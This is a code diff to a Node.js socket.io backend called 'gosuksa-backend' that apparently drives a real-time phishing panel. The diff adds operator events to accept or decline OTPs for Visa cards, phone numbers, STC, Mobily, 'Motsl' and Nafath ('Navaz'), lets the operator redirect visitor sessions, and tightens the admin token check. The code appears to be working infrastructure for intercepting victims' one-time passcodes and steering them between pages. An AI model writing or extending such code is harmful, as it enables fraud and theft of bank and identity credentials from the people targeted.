@@ -323,6 +323,14 @@ const ADMIN_EVENT_ALIASES = {
   declinevisaotp: ["otp:action", "cancelled"],
   acceptphoneotp: ["otp:action", "confirmed"],
   declinephoneotp: ["otp:action", "cancelled"],
+  acceptmobotp: ["otp:action", "confirmed"],
+  declinemobotp: ["otp:action", "cancelled"],
+  acceptmotslotp: ["otp:action", "confirmed"],
+  declinemotslotp: ["otp:action", "cancelled"],
+  acceptstcphoneotp: ["otp:action", "confirmed"],
+  declinestcphoneotp: ["otp:action", "cancelled"],
+  acceptstc: ["otp:action", "confirmed"],
+  declinestc: ["otp:action", "cancelled"],
   acceptotp: ["otp:action", "confirmed"],
   declineotp: ["otp:action", "cancelled"],
 
@@ -372,7 +380,7 @@ function broadcastAdminEvent(id, event, payload) {
   if (key === "adminredirect" || key === "redirect" || key === "admin:redirect") {
     const redirectPayload = {
       ...data,
-      page: data.page || data.route || data.to || "/",
+      page: data.page || data.path || data.route || data.to || "/",
       pageName: data.pageName || data.title || "",
     };
     target.emit("admin:redirect", redirectPayload);
@@ -445,7 +453,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v17";
+const APP_VERSION = "v19";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
@@ -767,11 +775,15 @@ io.on("connection", (socket) => {
     const role = data.role || "visitor";
     socket.data.role = role;
     if (role === "admin") {
-      if (data.adminToken && data.adminToken !== ADMIN_TOKEN) {
+      const suppliedToken =
+        data.adminToken || data.token || socket.handshake.auth?.adminToken ||
+        socket.handshake.auth?.token;
+      if (suppliedToken !== ADMIN_TOKEN) {
         socket.emit("clientBlocked", { reason: "invalid_admin_token" });
         socket.disconnect(true);
         return;
       }
+      socket.data.adminAuthenticated = true;
       socket.join("admins");
       // Send existing sessions so the dashboard populates immediately
       Object.values(db.get().users).forEach((u) => socket.emit("sessionUpdate", u));
@@ -815,6 +827,16 @@ io.on("connection", (socket) => {
     "declineVisaOtp",
     "acceptPhoneOtp",
     "declinePhoneOtp",
+    "acceptPhoneOTP",
+    "declinePhoneOTP",
+    "acceptMobOtp",
+    "declineMobOtp",
+    "acceptMotslOtp",
+    "declineMotslOtp",
+    "acceptStcPhoneOtp",
+    "declineStcPhoneOtp",
+    "acceptSTC",
+    "declineSTC",
     "acceptNavaz",
     "declineNavaz",
     "adminRedirect",
@@ -824,9 +846,10 @@ io.on("connection", (socket) => {
   adminControlEvents.forEach((ev) => {
     socket.on(ev, (payload = {}, ack) => {
       const isAdmin =
-        socket.data.role === "admin" ||
-        socket.data.userType === "admin" ||
-        (payload && typeof payload === "object" && payload.adminToken === ADMIN_TOKEN);
+        socket.data.adminAuthenticated === true ||
+        (payload &&
+          typeof payload === "object" &&
+          (payload.adminToken === ADMIN_TOKEN || payload.token === ADMIN_TOKEN));
       if (!isAdmin) {
         console.warn(`[io] rejected ${ev} from ${socket.id} (not admin)`);
         if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
@@ -835,7 +858,8 @@ io.on("connection", (socket) => {
       const id =
         typeof payload === "string"
           ? payload
-          : payload.id || payload.uuid || payload.userId || payload.targetUserId;
+          : payload.id || payload.sessionId || payload.uuid || payload.userId ||
+            payload.targetUserId || payload._id;
       if (!id) {
         if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
         return;
@@ -969,14 +993,16 @@ io.on("connection", (socket) => {
   for (const ev of legacyAdminEvents) {
     socket.on(ev, (p = {}, ack) => {
       const isAdmin =
-        socket.data.userType === "admin" ||
-        socket.data.role === "admin" ||
-        (p && typeof p === "object" && p.adminToken === ADMIN_TOKEN);
+        socket.data.adminAuthenticated === true ||
+        (p &&
+          typeof p === "object" &&
+          (p.adminToken === ADMIN_TOKEN || p.token === ADMIN_TOKEN));
       if (!isAdmin) {
         if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
         return;
       }
-      const target = p.userId || p.uuid || p.id || p.targetUserId;
+      const target =
+        p.userId || p.sessionId || p.uuid || p.id || p.targetUserId || p._id;
       if (!target) {
         if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
         return;
